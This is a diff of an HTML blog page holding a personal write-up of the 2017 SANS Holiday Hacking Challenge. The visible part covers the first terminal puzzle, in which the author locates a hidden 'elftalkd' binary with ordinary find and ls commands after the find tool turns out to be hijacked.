@@ -1,63 +1,202 @@
-	<!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml"  xml:lang="en-us" lang="en-us" >
+
+<!DOCTYPE html>
+<html lang="en-us">
 
 <head>
-  <link href="http://gmpg.org/xfn/11" rel="profile">
-  <meta http-equiv="content-type" content="text/html; charset=utf-8"> <meta name="generator" content="Hugo 0.29" />
+   
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    
+    <meta property="og:title" content=" 2017 SANS Holiday Hacking Challenge &middot;  Simple Guy" />
+    <meta property="og:site_name" content="Simple Guy" />
+    <meta property="og:url" content="https://simpleguy.tech/post/2017-sans-holiday-hacking-challenge/" />
 
-  
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1"> 
-  <title>2017 SANS Holiday Hacking Challenge &middot; Dig deeper-Try harder-Repeat</title>
-  
+    
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content="2017-12-16T22:42:59-05:00" />
+    <meta property="og:article:tag" content="SANS" />
+    <meta property="og:article:tag" content="HHC" />
+    
 
-  
-  <link rel="stylesheet" href="https://simpleguy.tech/css/poole.css">
-  <link rel="stylesheet" href="https://simpleguy.tech/css/syntax.css">
-  <link rel="stylesheet" href="https://simpleguy.tech/css/hyde.css">
-  <link rel="stylesheet" href="https://simpleguy.tech/css/font-awesome.min.css">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
-  
-  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
-  <link rel="shortcut icon" href="/favicon.png">
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@flyingpassword" />
+    <meta name="twitter:creator" content="@flyingpassword" />
+    <meta name="twitter:title" content="2017 SANS Holiday Hacking Challenge" />
+    
+    <meta name="twitter:description" content="This year, I&rsquo;ve had the chance to participate in SANS Holiday Hacking Challenge. The first time I did it was last year. I didn&rsquo;t think it was interesting with real pentesting stuffs until I read the writeups, so I decided to start early this year.
+Terminal Challenges
+Finding Great Book Pages
+Things I&rsquo;ve learned
 
-  
-  <link href="" rel="alternate" type="application/rss+xml" title="Dig deeper-Try harder-Repeat" />
+Terminal Challenges WINTER WONDER LANDING Linux command hijacking Click on the terminal, we are presented with the object: to find elftalkd." />
+    <meta name="twitter:url" content="https://simpleguy.tech/post/2017-sans-holiday-hacking-challenge/" />
+    
+
+    <title> 2017 SANS Holiday Hacking Challenge &middot;  Simple Guy</title>
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+    <link rel="preload" href="/js/main.js" as="script" />
+    <link rel="preload" href="/css/main.css" as="style" />
+    
+    
+
+
+    
+    <meta name="description" content="I&#39;m a simple guy." />
+    
+
+    
+    <meta name="p:domain_verify" content=""/>
+    
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="MobileOptimized" content="320" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    
+    
+
+    
+    <link href="https://simpleguy.tech/index.xml" rel="alternate" type="application/rss+xml" title="Simple Guy" />
+    
+
+    
+    <link rel="canonical" href="https://simpleguy.tech/post/2017-sans-holiday-hacking-challenge/" />
+
+    
+    <script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "https://simpleguy.tech/post/2017-sans-holiday-hacking-challenge/"
+        },
+        "headline": "2017 SANS Holiday Hacking Challenge",
+        "description": "",
+        "author": {
+            "@type": "Person",
+            "name": "Duc Phan",
+            "url": "http://profiles.google.com/?rel=author",
+            "image": {
+              "@type": "ImageObject",
+              "url": "https:",
+              "height": 80,
+              "width": 80
+            }
+        },
+        "publisher": {
+          "@type": "Organization",
+          "@id": "https://simpleguy.tech/",
+          "name": "Simple Guy",
+          "url": "https://simpleguy.tech/",
+          "logo": {
+            "@type": "ImageObject",
+            "url": "https:",
+            "height": 80,
+            "width": 80
+          }
+        },
+        
+        "image": {
+          "@type": "ImageObject",
+          "url": "",
+          "height": 80,
+          "width": 80
+        },
+        "datePublished": "2017-12-16",
+        "dateModified": "2017-12-16",
+        "wordCount": 4472,
+        "keywords": ["SANS","HHC"] 
+    }
+    </script>
+    
+
+    
+    <script type="text/javascript">
+        
+        
+        var disqus_shortname = 'asimpleguy';
+        var disqus_identifier = 'https:\/\/simpleguy.tech\/post\/2017-sans-holiday-hacking-challenge\/';
+        var disqus_title = '2017 SANS Holiday Hacking Challenge';
+        var disqus_url = 'https:\/\/simpleguy.tech\/post\/2017-sans-holiday-hacking-challenge\/';
+        
+    </script>
+    
+
+    <script type="text/javascript">
+        var config = {
+            baseUrl: "https:\/\/simpleguy.tech\/"
+        };
+    </script>
+
+    <style>
+html{font-family:sans-serif;line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,figure,footer,header,main,nav,section{display:block}h1{font-size:2em;margin:.67em 0}figure{margin:1em 40px}a{background-color:transparent;-webkit-text-decoration-skip:objects}img{border-style:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:300;src:local("Merriweather Sans Light"),local(MerriweatherSans-Light),url(//fonts.gstatic.com/s/merriweathersans/v5/6LmGj5dOJopQKEkt88GowY_zIojJi0m4a5Z6tRh6itY.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:400;src:local("Merriweather Sans Regular"),local(MerriweatherSans-Regular),url(//fonts.gstatic.com/s/merriweathersans/v5/AKu1CjQ4qnV8MUltkAX3sL2aU247V0zTzydO4RoO9Ok.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:700;src:local("Merriweather Sans Bold"),local(MerriweatherSans-Bold),url(//fonts.gstatic.com/s/merriweathersans/v5/6LmGj5dOJopQKEkt88GowQfd-b-I5PxxcmB4_-MNcqw.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:normal;font-weight:800;src:local("Merriweather Sans ExtraBold"),local(MerriweatherSans-ExtraBold),url(//fonts.gstatic.com/s/merriweathersans/v5/6LmGj5dOJopQKEkt88GowWT7sFQ1Iz1BbpcuCPlgc9Q.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:italic;font-weight:300;src:local("Merriweather Sans Light Italic"),local(MerriweatherSans-LightItalic),url(//fonts.gstatic.com/s/merriweathersans/v5/nAqt4hiqwq3tzCecpgPmVX9UU5BmOJGkLxUCVv5VXdc.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:italic;font-weight:400;src:local("Merriweather Sans Italic"),local(MerriweatherSans-Italic),url(//fonts.gstatic.com/s/merriweathersans/v5/3Mz4hOHzs2npRMG3B1ascf0KIgDhPIHb_R-SWdtqte8.woff) format("woff")}@font-face{font-family:'Merriweather Sans';font-style:italic;font-weight:700;src:local("Merriweather Sans Bold Italic"),local(MerriweatherSans-BoldItalic),url(//fonts.gstatic.com/s/merriweathersans/v5/nAqt4hiqwq3tzCecpgPmVYM8pfYvjMoOxygpzLVILAs.woff) format("woff")}@font-face {font-family: 'Aldrich';font-style: normal;font-weight: 400;src: local('Aldrich Regular'), local('Aldrich-Regular'), url('//fonts.gstatic.com/s/aldrich/v8/j-NnyokbAnhXANS2iZ6Jew.woff2') format('woff2');unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;font-style:normal}[class^="icon-"]:before{font-family:"icons";font-style:normal;font-weight:400;speak:none;display:inline-block;text-decoration:inherit;width:1em;margin-right:.2em;text-align:center;font-variant:normal;text-transform:none;line-height:1em;margin-left:.2em;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.icon-arrow-right:before{content:'\e807'}.icon-rss:before{content:'\e808'}body{font:300 1em / 1.5em 'Merriweather Sans',sans-serif;color:#595B66}a{color:inherit;text-decoration:none;font-weight:400}h1,h2{text-rendering:optimizeLegibility;color:#1F2026}h2 a{font-weight:inherit}h1{font-size:2em;line-height:1em;margin:2em 0 -.5em}h2{font-size:1.75em;line-height:1.143em;margin:2.286em 0 -.571em}p{margin:2em auto}i{font-weight:400;font-style:italic;color:#363740}img{display:block;max-width:100%;height:auto;margin:2.5em auto}body{background:#fff}.inner{max-width:48em;margin:0 auto;padding:0 1em}#wrapper{position:relative;box-sizing:border-box;width:100%;min-height:100vh;padding-bottom:6em;background:#F2F3F5}#push{transform:translate3d(0,0,0);transform-style:preserve-3d;opacity:1}#nav{position:relative;background:#fff;z-index:70;transform:translate3d(0,0,0);transform-style:preserve-3d;opacity:1}#nav:after{clear:both;content:'';display:table}#nav .nav-logo{float:left;height:2em;padding:1em;max-width:50%}#nav .nav-logo img{width:auto;max-width:none;height:2em;margin:0;border-radius:5px}#nav .nav-menu{float:right}#nav .nav-menu:after{clear:both;content:'';display:table}#nav .nav-menu a{display:block;width:1em;height:1em;line-height:1em;padding:1.5em;text-align:center;float:left}#nav .nav-menu a i:before{margin:auto}.overlay{display:none;position:fixed;left:0;top:0;width:100%;height:100%;z-index:80;display:none}.overlay:before{content:'';position:absolute;left:0;top:0;width:100%;height:100%;background:#1F2026;opacity:0;transform-style:preserve-3d}#header{position:relative;padding:4em 0}#header .inner{position:relative;z-index:2}#header .header-title{display:block;text-align:center}#header .header-name{font-family: Aldrich, sans-serif;font-weight:700;letter-spacing:-1px;display:block;line-height:1em;font-size:2em;text-decoration:none;color:#1F2026;padding:0;margin:0}#header.has-cover .header-name{color:#fff}#header .header-description{display:block;margin:1em auto 0;color:#9D9FA6;position:relative;font-weight:300}#header .header-description:after{content:'';position:absolute;height:1px;width:100px;margin-left:-50px;left:50%;top:-.5em;background:#D4D5D9}#header.has-cover .header-description{color:#fff}#header.has-cover .header-description:after{background:#fff}#header .header-cover{position:absolute;width:100%;height:100%;top:0;left:0;margin-top:-4em;padding:4em 0;background:no-repeat fixed center 100% / cover;z-index:1}#header .header-cover:before{content:'';position:absolute;width:100%;height:100%;left:0;top:0;background:rgba(0,0,0,0.2)}#header .header-cover:after{content:'';position:absolute;width:100%;left:0;bottom:0;border-bottom:4px solid #19A0D7}#footer{position:absolute;width:100%;left:0;bottom:0;font-size:.75em;line-height:1.334em;background:#1F2026;color:#737580;z-index:20;transform:translate3d(0,0,0);transform-style:preserve-3d;opacity:1}#footer a{color:#9D9FA6;font-weight:400}#footer .credits{text-align:center;font-size:.75em;line-height:1.334em;padding:2.667em;overflow:auto}#footer .credits span{display:block}#footer .credits .credits-theme{float:left}#footer .credits .credits-software{float:right}.post{position:relative;z-index:20}.post .post-image{display:block;margin:0;padding:0}.post .post-image img{display:block;width:100%;height:auto;margin:0;padding:0}.post .post-meta{display:block;font-size:.75em;line-height:1.334em;font-weight:400;margin-bottom:1.334em}.post .post-title{position:relative;color:#000;font-size:2em;line-height:1.375em;font-weight:800;text-indent:-1px;margin:.25em 0 .75em}.post .post-title:before{content:'';position:absolute;left:0;bottom:-.334em;width:1em;margin-bottom:-2px;border-bottom:4px solid #19A0D7}.post .post-title a{text-decoration:none;color:inherit;font-weight:inherit}#post-index{position:relative;max-width:1200px;margin:0 auto 4em;padding:.5em;z-index:10}@keyframes fade{0%{transform:translate3d(0,3em,0);opacity:0}100%{transform:translate3d(0,0,0);opacity:1}}.post-list{position:relative}.post-list .post{float:left;width:33.3%;transform:translate3d(0,3em,0);transform-style:preserve-3d;opacity:0;animation:fade ease-out .5s forwards;animation-delay:1.4s}@media only screen and (max-width: 50em){.post-list .post{width:49.9%}}@media only screen and (max-width: 30em){.post-list .post{width:100%;float:none}}.post-list .post:nth-child(1){animation-delay:.1s}.post-list .post:nth-child(2){animation-delay:.2s}.post-list .post:nth-child(3){animation-delay:.3s}.post-list .post:nth-child(4){animation-delay:.4s}.post-list .post:nth-child(5){animation-delay:.5s}.post-list .post:nth-child(6){animation-delay:.6s}.post-list .post:nth-child(7){animation-delay:.7s}.post-list .post:nth-child(8){animation-delay:.8s}.post-list .post:nth-child(9){animation-delay:.9s}.post-list .post .inner{word-wrap:break-word;padding:2em;margin:.5em;max-width:none;background:#fff;box-sizing:border-box;transform:scale(1);transform-style:preserve-3d}@media only screen and (max-width: 50em){.post-list .post .inner{padding:1em}}.post-list .post .post-link{position:absolute;left:0;top:0;width:100%;height:100%;z-index:10}.post-list .post .post-image{position:relative;margin:-2em -2em 0;overflow:hidden;background:#19A0D7}@media only screen and (max-width: 50em){.post-list .post .post-image{margin:-1em -1em 0}}.post-list .post .post-image img{transform:scale(1);transform-style:preserve-3d;opacity:1}.post-list .post .post-image:after{content:'';position:absolute;left:-5%;bottom:-2.5em;width:110%;height:4em;background:#fff;border-top:4px solid #19A0D7;box-shadow:0 0 2em rgba(0,0,0,0.2);transform:rotate(5deg)}.post-list .post .post-title{font-size:1.5em;line-height:1.167em}.post-list .post .post-excerpt{margin:0}.post-list .post .post-more{display:block;margin-top:1.5em}.post-list .post .post-more a{display:inline-block;font-size:.875em;line-height:1.143em;font-weight:400;color:#363740}.post-list .post .post-more a i{color:#0e77a0}.pagination{min-height:3em;margin:4em auto 2em;padding:0;position:relative}.pagination .pagination-item{position:relative;display:block;height:3em;line-height:3em;padding:0 1em;text-align:center;text-decoration:none;font-weight:700;color:#363740;border:1px solid #19A0D7;border-radius:4em;z-index:60}.pagination .pagination-item i{position:relative}@media only screen and (max-width: 30em){.pagination .pagination-item{width:4em;height:4em;line-height:4em;margin-top:-.5em;padding:0!important}.pagination .pagination-item i{font-size:1.5em}.pagination .pagination-item>span{display:none}}.pagination .pagination-prev{float:right}.pagination .pagination-prev i{right:-.05em}.pagination .pagination-info{display:block;left:0;top:0;height:3em;line-height:3em;position:absolute;text-align:center;width:100%;z-index:50;color:#9D9FA6}#loader-wrapper{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1000}#loader{display:block;position:relative;left:50%;top:50%;width:150px;height:150px;margin:-75px 0 0 -75px;border-radius:50%;border:3px solid transparent;border-top-color:#19A0D7;animation:spin 2s linear infinite}#loader:before{content:"";position:absolute;top:5px;left:5px;right:5px;bottom:5px;border-radius:50%;border:3px solid transparent;border-top-color:#0e77a0;animation:spin 3s linear infinite}#loader:after{content:"";position:absolute;top:15px;left:15px;right:15px;bottom:15px;border-radius:50%;border:3px solid transparent;border-top-color:#D4D5D9;animation:spin 1.5s linear infinite}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+</style>
+
+
 </head>
-	<body class=" ">
-		<div class="sidebar">
-  <div class="container sidebar-sticky">
-    <div class="sidebar-about">
-      <a href="https://simpleguy.tech/"><h1>Dig deeper-Try harder-Repeat</h1></a>
-      <p class="lead">
-       I&#39;m a simple guy. 
-      </p>
-    </div>
-
-    <ul class="sidebar-nav">
-      <li><a href="/">Home</a> </li>
-      
-      <li><a href="/tags">Tags</a>  </li>
-      <li><a href="/categories">Categories</a>  </li>
-      <li><a href="/projects">Projects</a>  </li>
-      <p></p>
-      <span class="sidebar-nav-item fa fa-github">
-        <a href="https://github.com/ducphanduyagentp"> github.com/ducphanduyagentp</a>
-      </span>
-      <span class="sidebar-nav-item fa fa-twitter">
-        <a href="https://twitter.com/@flyingpassword"> @flyingpassword</a>
-      </span>
-    </ul>
-      
-    <p>&copy; 2018. All rights reserved. </p>
-  </div>
+<body class="home-template">
+<div id="loader-wrapper">
+    <div id="loader"></div>
 </div>
+<section id="wrapper" style="display: none;">
+    <div id="ajax-container">
+        <nav id="nav" class="nav">
+            <div class="nav-logo">
+                <a href="https://simpleguy.tech/">
+                    
+                    Simple Guy
+                    
+                </a>
+            </div>
+            <div id="main-menu" class="nav-menu">
+                
+                
+                    <a class="nav-social" target="_blank" href="https://twitter.com/flyingpassword" title="Simple Guy on Twitter"><i class="fa fa-twitter"></i></a>
+                
+                
+                    <a class="nav-social" target="_blank" href="https://linkedin.com/in/ducphanduy" title="Simple Guy on LinkedIn"><i class="fa fa-linkedin"></i></a>
+                
+                
+                <a class="nav-social" target="_blank" href="https://github.com/ducphanduyagentp" title="Simple Guy on GitHub"><i class="fa fa-github"></i></a>
+                
+                <a id="search-button" onclick="$('#search-form').toggle();" title="Search"><i class="fa fa-search"></i></a>
+                <form id="search-form" method="get" role="search" action="https://google.com/search">
+                    <input type="hidden" name="as_sitesearch" value="https://simpleguy.tech/">
+                    <input type="text" name="q" maxlength="255" placeholder="Search..." class="form-control">
+                    <input type="submit" value="Search">
+                </form>
+                
+                
+                
+                
+                <a id="main-menu-button" class="menu" data-action="menu" data-target="menu"
+                   title="Main Menu"><i class="fa fa-navicon"></i></a>
+                
+            </div>
+        </nav>
 
 
-		<div class="content container">
-			<div class="post">
-			 	<h1>2017 SANS Holiday Hacking Challenge</h1>
-			  <span class="post-date">Sat, Dec 16, 2017</span>
-			      
+<main class="content" role="main">
+    <article class="post">
+        <div class="inner">
+
+            <div id="push">
+
+                <header class="post-header">
+                
+                    <span class="post-meta">
+                        <span class="post-date">16 Dec 2017</span> <span class="reading-time">| <span class="estimated-reading-time">21 min.</span> (<span class="word-count">4472</span> words)</span></span>
+                    </span>
+                <div class="clear"></div>
+                
+                <h1 class="post-title">2017 SANS Holiday Hacking Challenge</h1>
+              </header>
+
+              <section class="post-content">
+                
+                  
 
 <p>This year, I&rsquo;ve had the chance to participate in SANS Holiday Hacking Challenge. The first time I did it was last year. I didn&rsquo;t think it was interesting with real pentesting stuffs until I read the writeups, so I decided to start early this year.</p>
 
@@ -76,483 +215,545 @@
 <h3 id="linux-command-hijacking">Linux command hijacking</h3>
 
 <p>Click on the terminal, we are presented with the object: to find elftalkd.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">                                 </span><span style="">|</span><span style="">
-</span><span style="">                               </span><span style="color:#ae81ff">\ </span><span style="color:#e6db74">&#39; /
-</span><span style="color:#e6db74">                             -- (*) --
-</span><span style="color:#e6db74">                                &gt;*&lt;
-</span><span style="color:#e6db74">                               &gt;0&lt;@&lt;
-</span><span style="color:#e6db74">                              &gt;&gt;&gt;@&lt;&lt;*
-</span><span style="color:#e6db74">                             &gt;@&gt;*&lt;0&lt;&lt;&lt;
-</span><span style="color:#e6db74">                            &gt;*&gt;&gt;@&lt;&lt;&lt;@&lt;&lt;
-</span><span style="color:#e6db74">                           &gt;@&gt;&gt;0&lt;&lt;&lt;*&lt;&lt;@&lt;
-</span><span style="color:#e6db74">                          &gt;*&gt;&gt;0&lt;&lt;@&lt;&lt;&lt;@&lt;&lt;&lt;
-</span><span style="color:#e6db74">                         &gt;@&gt;&gt;*&lt;&lt;@&lt;&gt;*&lt;&lt;0&lt;*&lt;
-</span><span style="color:#e6db74">           \*/          &gt;0&gt;&gt;*&lt;&lt;@&lt;&gt;0&gt;&lt;&lt;*&lt;@&lt;&lt;
-</span><span style="color:#e6db74">       ___\\U//___     &gt;*&gt;&gt;@&gt;&lt;0&lt;&lt;*&gt;&gt;@&gt;&lt;*&lt;0&lt;&lt;
-</span><span style="color:#e6db74">       |\\ | | \\|    &gt;@&gt;&gt;0&lt;*&lt;0&gt;&gt;@&lt;&lt;0&lt;&lt;&lt;*&lt;@&lt;&lt;  
-</span><span style="color:#e6db74">       | \\| | _(UU)_ &gt;((*))_&gt;0&gt;&lt;*&lt;0&gt;&lt;@&lt;&lt;&lt;0&lt;*&lt;
-</span><span style="color:#e6db74">       |\ \| || / //||.*.*.*.|&gt;&gt;@&lt;&lt;*&lt;&lt;@&gt;&gt;&lt;0&lt;&lt;&lt;
-</span><span style="color:#e6db74">       |\\_|_|&amp;&amp;_// ||*.*.*.*|_\\db//_               
-</span><span style="color:#e6db74">       &#34;&#34;&#34;&#34;|&#39;</span><span style="">.</span><span style="color:#e6db74">&#39;.&#39;</span><span style="">.</span><span style="">|</span><span style="">~~</span><span style="">|</span><span style="">.*.*.*</span><span style="">|</span><span style="">     ____</span><span style="">|</span><span style="">_
-</span><span style="">           </span><span style="">|</span><span style="color:#e6db74">&#39;.&#39;</span><span style="">.</span><span style="color:#e6db74">&#39;.|   ^^^^^^|____|&gt;&gt;&gt;&gt;&gt;&gt;|
-</span><span style="color:#e6db74">           ~~~~~~~~         &#39;</span><span style="color:#e6db74">&#34;&#34;&#34;&#34;</span><span style="color:#e6db74">`</span><span style="">------</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="">
-</span><span style="">My name is Bushy Evergreen, and I have a problem </span><span style="color:#66d9ef">for</span><span style=""> you.
-</span><span style="">I think a server got owned, and I can only offer a clue.
-</span><span style="">We use the system </span><span style="color:#66d9ef">for</span><span style=""> chat, to keep toy production running.
-</span><span style="">Can you </span><span style="">help</span><span style=""> us recover from the server connection shunning?
-</span><span style="">Find and run the elftalkd binary to </span><span style="">complete</span><span style=""> this challenge.</span></code></pre>
-</div>
+
+<pre><code>                                 |
+                               \ ' /
+                             -- (*) --
+                                &gt;*&lt;
+                               &gt;0&lt;@&lt;
+                              &gt;&gt;&gt;@&lt;&lt;*
+                             &gt;@&gt;*&lt;0&lt;&lt;&lt;
+                            &gt;*&gt;&gt;@&lt;&lt;&lt;@&lt;&lt;
+                           &gt;@&gt;&gt;0&lt;&lt;&lt;*&lt;&lt;@&lt;
+                          &gt;*&gt;&gt;0&lt;&lt;@&lt;&lt;&lt;@&lt;&lt;&lt;
+                         &gt;@&gt;&gt;*&lt;&lt;@&lt;&gt;*&lt;&lt;0&lt;*&lt;
+           \*/          &gt;0&gt;&gt;*&lt;&lt;@&lt;&gt;0&gt;&lt;&lt;*&lt;@&lt;&lt;
+       ___\\U//___     &gt;*&gt;&gt;@&gt;&lt;0&lt;&lt;*&gt;&gt;@&gt;&lt;*&lt;0&lt;&lt;
+       |\\ | | \\|    &gt;@&gt;&gt;0&lt;*&lt;0&gt;&gt;@&lt;&lt;0&lt;&lt;&lt;*&lt;@&lt;&lt;  
+       | \\| | _(UU)_ &gt;((*))_&gt;0&gt;&lt;*&lt;0&gt;&lt;@&lt;&lt;&lt;0&lt;*&lt;
+       |\ \| || / //||.*.*.*.|&gt;&gt;@&lt;&lt;*&lt;&lt;@&gt;&gt;&lt;0&lt;&lt;&lt;
+       |\\_|_|&amp;&amp;_// ||*.*.*.*|_\\db//_               
+       &quot;&quot;&quot;&quot;|'.'.'.|~~|.*.*.*|     ____|_
+           |'.'.'.|   ^^^^^^|____|&gt;&gt;&gt;&gt;&gt;&gt;|
+           ~~~~~~~~         '&quot;&quot;&quot;&quot;`------'
+My name is Bushy Evergreen, and I have a problem for you.
+I think a server got owned, and I can only offer a clue.
+We use the system for chat, to keep toy production running.
+Can you help us recover from the server connection shunning?
+Find and run the elftalkd binary to complete this challenge.
+</code></pre>
+
 <p>Let&rsquo;s try using find:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@5e210ec83121:/run/elftalk/bin$ find / -xdev -iname </span><span style="color:#e6db74">&#34;*elftalkd*&#34;</span><span style="">
-</span><span style="">bash: /usr/local/bin/find: cannot execute binary file: Exec format error</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@5e210ec83121:/run/elftalk/bin$ find / -xdev -iname &quot;*elftalkd*&quot;
+bash: /usr/local/bin/find: cannot execute binary file: Exec format error
+
+</code></pre>
+
 <p>No surprise. Let&rsquo;s use <code>ls</code> to find this</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@5e210ec83121:/tmp$ ls -laR / </span><span style="">|</span><span style=""> grep -B </span><span style="color:#ae81ff">10</span><span style=""> elftalkd
-</span><span style="">ls: cannot open directory </span><span style="color:#e6db74">&#39;/proc/tty/driver&#39;</span><span style="">: Permission denied
-</span><span style="">ls: cannot open directory </span><span style="color:#e6db74">&#39;/root&#39;</span><span style="">: Permission denied
-</span><span style="">/run/elftalk:
-</span><span style="">total </span><span style="color:#ae81ff">12</span><span style="">
-</span><span style="">drwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> root root </span><span style="color:#ae81ff">4096</span><span style=""> Dec  </span><span style="color:#ae81ff">4</span><span style=""> </span><span style="color:#ae81ff">14</span><span style="">:32 .
-</span><span style="">drwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> root root </span><span style="color:#ae81ff">4096</span><span style=""> Dec  </span><span style="color:#ae81ff">4</span><span style=""> </span><span style="color:#ae81ff">14</span><span style="">:32 ..
-</span><span style="">drwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> root root </span><span style="color:#ae81ff">4096</span><span style=""> Dec  </span><span style="color:#ae81ff">4</span><span style=""> </span><span style="color:#ae81ff">14</span><span style="">:32 bin
-</span><span style="">/run/elftalk/bin:
-</span><span style="">total </span><span style="color:#ae81ff">7224</span><span style="">
-</span><span style="">drwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> root root    </span><span style="color:#ae81ff">4096</span><span style=""> Dec  </span><span style="color:#ae81ff">4</span><span style=""> </span><span style="color:#ae81ff">14</span><span style="">:32 .
-</span><span style="">drwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> root root    </span><span style="color:#ae81ff">4096</span><span style=""> Dec  </span><span style="color:#ae81ff">4</span><span style=""> </span><span style="color:#ae81ff">14</span><span style="">:32 ..
-</span><span style="">-rwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> root root </span><span style="color:#ae81ff">7385168</span><span style=""> Dec  </span><span style="color:#ae81ff">4</span><span style=""> </span><span style="color:#ae81ff">14</span><span style="">:29 elftalkd
-</span><span style="">ls: cannot open directory </span><span style="color:#e6db74">&#39;/var/cache/apt/archives/partial&#39;</span><span style="">: Permission denied
-</span><span style="">ls: cannot open directory </span><span style="color:#e6db74">&#39;/var/cache/ldconfig&#39;</span><span style="">: Permission denied
-</span><span style="">ls: cannot open directory </span><span style="color:#e6db74">&#39;/var/lib/apt/lists/partial&#39;</span><span style="">: Permission denied</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@5e210ec83121:/tmp$ ls -laR / | grep -B 10 elftalkd
+ls: cannot open directory '/proc/tty/driver': Permission denied
+ls: cannot open directory '/root': Permission denied
+/run/elftalk:
+total 12
+drwxr-xr-x 1 root root 4096 Dec  4 14:32 .
+drwxr-xr-x 1 root root 4096 Dec  4 14:32 ..
+drwxr-xr-x 1 root root 4096 Dec  4 14:32 bin
+/run/elftalk/bin:
+total 7224
+drwxr-xr-x 1 root root    4096 Dec  4 14:32 .
+drwxr-xr-x 1 root root    4096 Dec  4 14:32 ..
+-rwxr-xr-x 1 root root 7385168 Dec  4 14:29 elftalkd
+ls: cannot open directory '/var/cache/apt/archives/partial': Permission denied
+ls: cannot open directory '/var/cache/ldconfig': Permission denied
+ls: cannot open directory '/var/lib/apt/lists/partial': Permission denied
+</code></pre>
+
 <p>There we go. The binary is in <code>/run/elftalk/bin</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@466dc314ba46:~$ /run/elftalk/bin/elftalkd 
-</span><span style="">        Running in interactive mode
-</span><span style="">        --</span><span style="color:#f92672">==</span><span style=""> Initializing </span><span style="">elftalkd</span><span style=""> </span><span style="color:#f92672">==</span><span style="">--
-</span><span style="">Initializing Messaging System!
-</span><span style="">Nice-O-Meter configured to </span><span style="color:#ae81ff">0</span><span style="">.90 sensitivity.
-</span><span style="">Acquiring messages from </span><span style="">local</span><span style=""> networks...
-</span><span style="">--</span><span style="color:#f92672">==</span><span style=""> Initialization </span><span style="">Complete</span><span style=""> </span><span style="color:#f92672">==</span><span style="">--
-</span><span style="">      _  __ _        _ _       _ 
-</span><span style="">     </span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">/ _</span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">      </span><span style="">|</span><span style=""> </span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">     </span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">
-</span><span style="">  ___</span><span style="">|</span><span style=""> </span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">_</span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">_ __ _</span><span style="">|</span><span style=""> </span><span style="">|</span><span style=""> </span><span style="">|</span><span style=""> ____</span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">
-</span><span style=""> / _ </span><span style="color:#ae81ff">\ </span><span style="">|</span><span style="">  _</span><span style="">|</span><span style=""> __/ _</span><span style="color:#e6db74">`</span><span style=""> </span><span style="">|</span><span style=""> </span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">/ / _</span><span style="color:#e6db74">`</span><span style=""> </span><span style="">|</span><span style="">
-</span><span style=""></span><span style="">|</span><span style="">  __/ </span><span style="">|</span><span style=""> </span><span style="">|</span><span style=""> </span><span style="">|</span><span style=""> </span><span style="color:#f92672">||</span><span style=""> </span><span style="color:#f92672">(</span><span style="">_</span><span style="">|</span><span style=""> </span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">   &lt; </span><span style="color:#f92672">(</span><span style="">_</span><span style="">|</span><span style=""> </span><span style="">|</span><span style="">
